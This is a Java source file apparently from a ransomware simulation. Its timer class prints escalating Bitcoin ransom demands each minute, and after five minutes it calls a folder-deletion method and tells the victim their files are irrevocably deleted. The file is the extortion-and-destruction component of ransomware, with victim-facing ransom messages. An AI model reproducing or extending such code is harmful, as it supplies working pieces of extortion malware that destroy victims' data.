import java.util.TimerTask;

public class S03_TimerTask extends TimerTask {
    Report report;
    private float ransomAmount = 0.02755f;
    private int minutesPassed = 0;

    public S03_TimerTask(Report report) {
        this.report = report;
    }

    public float getRansomAmount() {
        return ransomAmount;
    }

    public float updateRansomAmount(float alreadyPayed) {
        return ransomAmount -= alreadyPayed;
    }


    @Override
    public void run() {
        minutesPassed++;
        increaseRansomMoney();
        if (minutesPassed >= 5) {
            report.port.deleteFolderAttacker();
            System.out.println("\n---------------------------------");
            System.out.println("Time is over! Your files are irrevocably deleted...");
            System.out.println("---------------------------------");
            this.cancel();
        }
    }

    public void increaseRansomMoney() {
        if (minutesPassed < 5) {
            ransomAmount += 0.01f;
            ransomAmount= (float)((int)(ransomAmount*100000))/100000;
            if (minutesPassed >= 4) {
                System.out.println("---------------------------------");
                System.out.println("Pay " + ransomAmount + " BTC immediately or your files will be irrevocably deleted.");
                System.out.println("---------------------------------");
            } else {
                System.out.println("\n---------------------------------");
                System.out.println(minutesPassed + " minutes passed since ransomware request.");
                System.out.println("Amount to pay increased by 0,01 to " + ransomAmount + " BTC!");
                System.out.println("Minutes left to the final encryption of your data: " + (5 - minutesPassed));
                System.out.println("---------------------------------");
            }
            System.out.println("To terminate the Terminal enter exit.");
            System.out.print("Enter your command: ");
        } else {
            report.port.deleteFolderAttacker();
            this.cancel();
        }
    }
}